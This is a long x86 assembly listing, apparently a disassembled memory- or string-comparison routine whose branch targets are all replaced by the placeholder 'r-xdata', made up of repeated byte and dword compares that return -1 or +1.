je r-xdata
movzx esi [ eax + 0x1 ]
movzx ebx [ ecx + 0x1 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
mov edx [ eax - 0x1c ]
cmp edx [ ecx - 0x1c ]
je r-xdata
mov edx [ eax - 0x18 ]
cmp edx [ ecx - 0x18 ]
je r-xdata
mov edx [ eax - 0x14 ]
cmp edx [ ecx - 0x14 ]
je r-xdata
mov edx [ eax - 0x10 ]
cmp edx [ ecx - 0x10 ]
je r-xdata
mov edx [ eax - 0xc ]
cmp edx [ ecx - 0xc ]
je r-xdata
mov edx [ eax - 0x8 ]
cmp edx [ ecx - 0x8 ]
je r-xdata
mov edx [ eax - 0x4 ]
cmp edx [ ecx - 0x4 ]
je r-xdata
mov edx [ eax - 0x1d ]
cmp edx [ ecx - 0x1d ]
je r-xdata
mov edx [ eax - 0x19 ]
cmp edx [ ecx - 0x19 ]
je r-xdata
mov edx [ eax - 0x15 ]
cmp edx [ ecx - 0x15 ]
je r-xdata
mov edx [ eax - 0x11 ]
cmp edx [ ecx - 0x11 ]
je r-xdata
mov edx [ eax - 0xd ]
cmp edx [ ecx - 0xd ]
je r-xdata
mov edx [ eax - 0x9 ]
cmp edx [ ecx - 0x9 ]
je r-xdata
mov edx [ eax - 0x5 ]
cmp edx [ ecx - 0x5 ]
je r-xdata
movzx ecx [ ecx - 0x1 ]
movzx eax [ eax - 0x1 ]
sub eax ecx
je r-xdata
mov edx [ eax - 0x1e ]
cmp edx [ ecx - 0x1e ]
je r-xdata
mov edx [ eax - 0x1a ]
cmp edx [ ecx - 0x1a ]
je r-xdata
mov edx [ eax - 0x16 ]
cmp edx [ ecx - 0x16 ]
je r-xdata
mov edx [ eax - 0x12 ]
cmp edx [ ecx - 0x12 ]
je r-xdata
mov edx [ eax - 0xe ]
cmp edx [ ecx - 0xe ]
je r-xdata
mov edx [ eax - 0xa ]
cmp edx [ ecx - 0xa ]
je r-xdata
mov edx [ eax - 0x6 ]
cmp edx [ ecx - 0x6 ]
je r-xdata
mov dx [ eax - 0x2 ]
cmp dx [ ecx - 0x2 ]
je r-xdata
mov edx [ eax - 0x1f ]
cmp edx [ ecx - 0x1f ]
je r-xdata
mov edx [ eax - 0x1b ]
cmp edx [ ecx - 0x1b ]
je r-xdata
mov edx [ eax - 0x17 ]
cmp edx [ ecx - 0x17 ]
je r-xdata
mov edx [ eax - 0x13 ]
cmp edx [ ecx - 0x13 ]
je r-xdata
mov edx [ eax - 0xf ]
cmp edx [ ecx - 0xf ]
je r-xdata
mov edx [ eax - 0xb ]
cmp edx [ ecx - 0xb ]
je r-xdata
mov edx [ eax - 0x7 ]
cmp edx [ ecx - 0x7 ]
je r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
pop ebx
jmp r-xdata
xor esi esi
movzx esi [ eax + 0x4 ]
movzx ebx [ ecx + 0x4 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x2 ]
movzx ebx [ ecx + 0x2 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xc ]
movzx esi [ eax - 0xc ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor eax eax
movzx esi dl
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0x9 ]
movzx esi [ eax - 0x9 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor ecx ecx
test eax eax
setg cl
lea eax [ ecx + ecx - 0x1 ]
jmp r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1e ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xa ]
movzx esi [ eax - 0xa ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
movzx edx [ ecx - 0x2 ]
movzx esi [ eax - 0x2 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0x1f ]
movzx esi [ eax - 0x1f ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xf ]
movzx esi [ eax - 0xf ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
je r-xdata
mov esi [ eax + 0x8 ]
cmp esi [ ecx + 0x8 ]
je r-xdata
movzx esi [ eax + 0x5 ]
movzx ebx [ ecx + 0x5 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x3 ]
movzx ebx [ ecx + 0x3 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x7 ]
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x8 ]
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1d ]
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx edx [ ecx - 0x9 ]
movzx esi [ eax - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
movzx esi [ eax - 0x1e ]
movzx edx [ ecx - 0x1e ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
mov eax edx
jmp r-xdata
xor esi esi
movzx esi [ eax + 0x8 ]
movzx ebx [ ecx + 0x8 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x6 ]
movzx ebx [ ecx + 0x6 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x2 ]
movzx edx [ ecx - 0x2 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
mov eax edx
jmp r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x7 ]
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx edx [ ecx - 0x8 ]
movzx esi [ eax - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
jmp r-xdata
movzx esi [ eax - 0x1d ]
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x9 ]
movzx edx [ ecx - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
mov esi [ eax + 0xc ]
cmp esi [ ecx + 0xc ]
je r-xdata
movzx esi [ eax + 0x9 ]
movzx ebx [ ecx + 0x9 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x7 ]
movzx ebx [ ecx + 0x7 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x9 ]
movzx edx [ ecx - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
sub eax ecx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
je r-xdata
test eax eax
jne r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x2 ]
movzx edx [ ecx - 0x2 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx edx [ ecx - 0x7 ]
movzx esi [ eax - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x8 ]
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0xc ]
movzx ebx [ ecx + 0xc ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0xa ]
movzx ebx [ ecx + 0xa ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
xor ecx ecx
test eax eax
setg cl
lea eax [ ecx + ecx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea esi [ edx + edx - 0x1 ]
jmp r-xdata
mov esi [ eax + 0x10 ]
cmp esi [ ecx + 0x10 ]
je r-xdata
movzx esi [ eax + 0xd ]
movzx ebx [ ecx + 0xd ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0xb ]
movzx ebx [ ecx + 0xb ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
xor esi esi
movzx ebx [ ecx + 0x10 ]
movzx esi [ eax + 0x10 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0xe ]
movzx ebx [ ecx + 0xe ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
